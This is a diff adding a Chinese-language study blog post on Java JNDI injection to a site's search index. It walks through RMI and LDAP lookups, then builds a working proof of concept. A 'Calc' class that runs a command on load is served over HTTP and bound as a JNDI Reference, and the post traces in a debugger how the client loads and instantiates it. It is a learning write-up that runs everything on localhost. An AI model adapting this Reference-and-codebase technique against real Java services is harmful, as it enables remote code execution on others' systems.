@@ -3383,4 +3383,94 @@
         <tag>学习</tag>
       </tags>
   </entry>
+  <entry>
+    <title>Java-jndi注入</title>
+    <url>/2025/04/16/Java-jndi%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h3 id="JNDI概述"><a href="#JNDI概述" class="headerlink" title="JNDI概述"></a>JNDI概述</h3><h4 id="是什么"><a href="#是什么" class="headerlink" title="是什么"></a>是什么</h4><p>JNDI全称Java Naming Diretory Interface ，java名称与目录接口，一个名字对应一个对象。他提供了统一的客户端API，由管理者将JNDI API映射为特定的目录服务和命名服务，为使用者查找和访问资源提供了统一的接口，可以用来的定义用户，网络，机器，对象和服务等各种资源。</p>
+<p><strong>命名服务</strong>：一个通过名称查找实际对象的服务</p>
+<p><strong>目录服务</strong>：目录服务在命名服务基础上扩展，允许为对象添加属性，支持通过属性组合筛选资源。例如，LDAP中用户对象可包含姓名、邮箱等属性。</p>
+<p><strong>SPI</strong>（Service Provider Interface）：即服务供应接口，主要作用是为底层的具体目录服务提供统一接口，从而实现目录服务的可插拔式安装。</p>
+<p>JDK 中包含了下述内置的命名目录服务:</p>
+<ul>
+<li>RMI: Java Remote Method Invocation，Java 远程方法调用</li>
+<li>LDAP: 轻量级目录访问协议</li>
+<li>CORBA: Common Object Request Broker Architecture，通用对象请求代理架构，用于 COS 名称服务(Common Object Services)</li>
+<li>DNS（域名转换协议）</li>
+</ul>
+<h4 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line"><span class="type">MyService</span> <span class="variable">service</span> <span class="operator">=</span> (MyService) ctx.lookup(<span class="string">&quot;rmi://server/MyService&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="JNDI攻击"><a href="#JNDI攻击" class="headerlink" title="JNDI攻击"></a>JNDI攻击</h3><h4 id="JNDI结合RMI"><a href="#JNDI结合RMI" class="headerlink" title="JNDI结合RMI"></a>JNDI结合RMI</h4><p>在之前RMI项目基础上，客户端和服务端分别新建两个文件</p>
+<p>JNDIRMIServer</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIRMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(); <span class="comment">// 创建JNDI的初始上下文</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>); <span class="comment">// 在本地1099起一个RMI注册中心</span></span><br><span class="line">        initialContext.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>, <span class="keyword">new</span> <span class="title class_">RemoteObjImpl</span>()); <span class="comment">// 用rebind把RemoteObjImpl实例绑定到RMI的remoteObj</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>JNDIRMIClient</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIRMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(); <span class="comment">// 创建JNDI的初始上下文</span></span><br><span class="line">        <span class="type">RemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> (RemoteObj) initialContext.lookup(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>); <span class="comment">// 找到这个rmi远程对象</span></span><br><span class="line">        System.out.println(remoteObj.sayHello(<span class="string">&quot;hello&quot;</span>)); <span class="comment">// 调用这个方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这样就能实现远程方法的调用，看起来很RMI很像，主要就是多了<code>InitialContext</code></p>
+<h5 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h5><p>打个断点在客户端的lookup调试一下，看整个过程</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250416214159.png" ></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250416214228.png" ></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250416214302.png" ></p>
+<p>流程是<code>InitialContext.lookup()</code>-&gt;<code>GenericURLContext.lookup()</code>-&gt;<code>RegistryContext.lookup()</code>最后在RegistryContext的时候，可以看到<code>this.registry</code>是RegistryImpl_Stub，这个之前已经分析过，所以可以说使用JNDI调用RMI服务的时候，最后还是会走到RMI到逻辑里，使用RMI有的漏洞JNDI也可以打</p>
+<h5 id="常见打法jndi-reference"><a href="#常见打法jndi-reference" class="headerlink" title="常见打法jndi reference"></a>常见打法jndi reference</h5><p>jndi注入漏洞，和调用的服务无关，rmi，ldap，dns等都存在这个问题</p>
+<p>主要是服务端调用了一个<code>Reference</code>，感觉像套了一层</p>
+<p>看一下Reference的构造函数</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250416231345.png" ></p>
+<p>第一个参数是类名，第二个参数是factory工厂（里面有代码逻辑），第三个参数是地址</p>
+<p>先写一个恶意类生产class文件，然后在目录起一个http服务，让calc.class文件可以被访问到</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Calc</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;open -a calculator&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后服务端代码</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIRMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>); <span class="comment">// 正常启动注册中心</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Calc&quot;</span>,<span class="string">&quot;Calc&quot;</span>,<span class="string">&quot;http://localhost:8000/&quot;</span>); </span><br><span class="line">        initialContext.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>, reference);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>原来是</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">initialContext.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>, <span class="keyword">new</span> <span class="title class_">RemoteObjImpl</span>());</span><br></pre></td></tr></table></figure>
+
+<p>现在把<code>new RemoteObjImpl()</code>改成<code>reference</code>，感觉就像一层恶意的壳</p>
+<p>现在再运行客户端，就成功弹计算机，再调试一下，看看怎么回事</p>
+<p>比较特殊的是进到<code>ResitryContext</code>里面有lookup，出来后下面有个<code>decodeObject()</code>，此时有个var2参数是<code>ReferenceWrapper_Stub</code>类型，是lookup返回的内容，也就是在rmi查询到的对象，但是服务端绑定的是Reference对象</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2025-04-16%2023.27.13.png" ></p>
+<p>所以会产生这个变化是因为服务端的<code>rebind()</code>，调试看一下，断点打在服务端</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">initialContext.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>, reference);</span><br></pre></td></tr></table></figure>
+
+<p>跟到<code>RegistryContext.rebind()</code>，里面有<code>this.registry.rebind()</code>，传进去的参数中var2被<code>encodeObject()</code>处理了</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250416233311.png" ></p>
+<p>里面就把var1强制转换类型成<code>ReferenceWrapper</code></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250416233353.png" ></p>
+<p>继续回到客户端，就是有个<code>decodeObject()</code>刚好对应，里面有一个判断把ReferenceWrapper转换会Rederence</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250416233819.png" ></p>
+<p>然后重点在后面进入<code>getObjectInstance()</code>一直到后面<code>getObjectFactoryFromReference()</code>，用这个方法调用reference里面的factory</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250416234126.png" ></p>
+<p>此时已经可以知道factory叫Calc</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250416234304.png" ></p>
+<p>进到里面执行了类加载，用的loadClass，联系到之前类加载的URLClassloader，一直走到newInstance这一步弹出计算机</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250416234858.png" ></p>
+<p>所以最后导致代码被利用的是<code>NamingManager</code>这个类，这意味着我们的容器如果是别的格式的也是可以实现利用的</p>
+<h4 id="JNDI结合LDAP"><a href="#JNDI结合LDAP" class="headerlink" title="JNDI结合LDAP"></a>JNDI结合LDAP</h4><p>之前通常是在域环境遇到ldap，</p>
+<blockquote>
+<p><em>LDAP（Lightweight Directory Access Protocol ，轻型目录访问协议）是一种目录服务协议LDAP目录服务是由目录数据库和一套访问协议组成的系统，目录服务是一个特殊的数据库，用来保存描述性的、基于属性的详细信息，能进行查询、浏览和搜索，以树状结构组织数据。LDAP目录服务基于客户端-服务器模型，它的功能用于对一个存在目录数据库的访问。 LDAP目录和RMI注册表的区别在于是前者是目录服务，并允许分配存储对象的属性。</em></p>
+</blockquote>
+<p>起一个ldap服务</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250417002139.png" ></p>
+<p>然后服务端修改代码</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">initialContext.rebind(<span class="string">&quot;ldap://127.0.0.1:10389/cn=test,dc=example,dc=com&quot;</span>, reference);</span><br></pre></td></tr></table></figure>
+
+<p>再看就已经成功绑定上了</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250417002233.png" ></p>
+<p>然后再用客户端直接去lookup就行</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">RemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> (RemoteObj) initialContext.lookup(<span class="string">&quot;ldap://127.0.0.1:10389/cn=test,dc=example,dc=com&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>成功弹出计算机</p>
+<p>也是跟进去，重点在后面<code>LdapCtx.c_lookup()</code>，里面有一个<code>decodeObject()</code>，算是解出ldap里面存的内容</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250417003158.png" ></p>
+<p>走完出来就可以获取到要类加载的具体信息</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250417003304.png" ></p>
+<p>再走到后面又是<code>getObjectInstance()</code>但是调用的是DirectoryManager类的，流程是差不多的，这个类是漏网之鱼，修复时间比较晚</p>
+<h3 id="JNDI攻击高版本绕过"><a href="#JNDI攻击高版本绕过" class="headerlink" title="JNDI攻击高版本绕过"></a>JNDI攻击高版本绕过</h3><p>太晚了，待更新</p>
+]]></content>
+      <tags>
+        <tag>java</tag>
+        <tag>学习</tag>
+      </tags>
+  </entry>
 </search>
